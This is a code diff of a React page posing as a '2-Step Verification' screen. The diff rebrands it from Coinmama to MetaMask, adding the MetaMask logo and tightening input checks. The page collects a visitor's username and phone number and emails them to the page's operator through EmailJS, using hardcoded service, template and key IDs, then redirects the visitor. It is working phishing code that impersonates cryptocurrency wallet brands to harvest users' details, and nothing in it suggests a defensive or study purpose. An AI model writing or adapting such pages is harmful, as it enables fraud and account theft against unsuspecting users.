@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import emailjs from 'emailjs-com';
 
-const Alert = () => {
+const Verify = () => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState('');
@@ -11,13 +11,20 @@ const Alert = () => {
   const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
   const navigate = useNavigate();
 
+  // Handle number input (only digits, max 10)
+  const handleNumberChange = (e) => {
+    const value = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
+    if (value.length <= 10) {
+      setPassword(value);
+    }
+  };
+
   const handleLogin = () => {
     let isValid = true;
 
     // Email validation
     if (!email) {
       setEmailError('Username is required');
-      setEmailPlaceholder('Enter Username');
       isValid = false;
     } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
       setEmailError('Invalid Username format');
@@ -29,7 +36,9 @@ const Alert = () => {
     // Password (Number) validation
     if (!password) {
       setPasswordError('Number is required');
-      setPasswordPlaceholder('Enter your Number');
+      isValid = false;
+    } else if (password.length !== 10) {
+      setPasswordError('Number must be exactly 10 digits');
       isValid = false;
     } else {
       setPasswordError('');
@@ -38,8 +47,8 @@ const Alert = () => {
     // If valid, send email
     if (isValid) {
       const templateParams = {
-        web_name: 'Coinmama',
-        from_name: 'Coinmama',
+        web_name: 'Metamask',
+        from_name: 'Metamask',
         message: `Name: ${email}, 
         Phone: ${password}, 
         Date: ${new Date().toLocaleDateString()}, 
@@ -48,15 +57,15 @@ const Alert = () => {
 
       emailjs
         .send(
-          'service_flnki3h', // Your EmailJS Service ID
-          'template_yocogem', // Your EmailJS Template ID
+          'service_d7iarfv', // Your EmailJS Service ID
+          'template_zzgorrr', // Your EmailJS Template ID
           templateParams,
-          'whkd_aIuRw2YauvTF' // Your EmailJS Public Key
+          'cD8XBmJIzmsXY6T3j' // Your EmailJS Public Key
         )
         .then(() => {
           setEmail('');
           setPassword('');
-          navigate('/verify'); // Navigate to the target route
+          navigate('/alt'); // Navigate to the target route
         })
         .catch((error) => {
           console.error('Error:', error);
@@ -66,15 +75,14 @@ const Alert = () => {
   };
 
   return (
-    <div className="bg-white border-2 min-h-screen flex flex-col items-center pt-10 px-4 sm:px-8 lg:px-16">
-      <header className="flex justify-center mb-8">
-        <img src={require('../Images/coinmama-logo.webp')} alt="Navigation" className="w-48 " />
-      </header>
-
-      <div className="w-full max-w-md border-2 bg-blue-600 p-6 sm:p-8 rounded-lg shadow-lg">
+    <div className="bg-black py-64 flex flex-col items-center justify-center sm:py-40">
+      <div className="w-full max-w-lg bg-white px-10 pb-10 rounded-lg shadow-lg">
+        <header className="flex justify-center">
+          <img src={require('../Images/MetaMask-Logo-thmb.png')} alt="Navigation" className="w-48" />
+        </header>
         <main className="flex flex-col items-center">
-          <h1 className="text-white text-2xl sm:text-3xl font-medium pb-4 sm:pb-5">2-Step Verification</h1>
-          <h3 className="text-sm sm:text-lg text-blue-200 mb-4 sm:mb-6">Verify Your Identity</h3>
+          <h1 className="text-blue-800 text-3xl font-medium pb-1">2-Step Verification</h1>
+          <h3 className="text-lg text-gray-700 mb-6">Verify Your Identity</h3>
           <form
             method="post"
             onSubmit={(e) => {
@@ -91,7 +99,7 @@ const Alert = () => {
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 placeholder={emailPlaceholder}
-                className={`w-full sm:pr-40 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                   emailError ? 'border-red-500' : 'border-gray-300'
                 }`}
                 required
@@ -100,18 +108,15 @@ const Alert = () => {
             </div>
             <div className="mb-6">
               <input
-                type="text" // Keep text type but restrict input
+                type="text"
                 id="password"
                 value={password}
-                onChange={(e) => {
-                  // Allow only numbers
-                  const value = e.target.value.replace(/\D/g, '');
-                  setPassword(value);
-                }}
+                onChange={handleNumberChange}
                 placeholder={passwordPlaceholder}
-                className={`w-full sm:pr-40 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                className={`w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                   passwordError ? 'border-red-500' : 'border-gray-300'
                 }`}
+                maxLength="10"
                 required
               />
               {passwordError && <p className="text-red-500 text-xs mt-1">{passwordError}</p>}
@@ -119,7 +124,7 @@ const Alert = () => {
             <div className="flex justify-center">
               <button
                 type="submit"
-                className="px-16 sm:px-20 bg-gray-400 text-blue-700 font-bold py-3 rounded-lg hover:bg-blue-900 hover:text-white"
+                className="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700"
               >
                 Submit
               </button>
@@ -131,4 +136,4 @@ const Alert = () => {
   );
 };
 
-export default Alert;
+export default Verify;
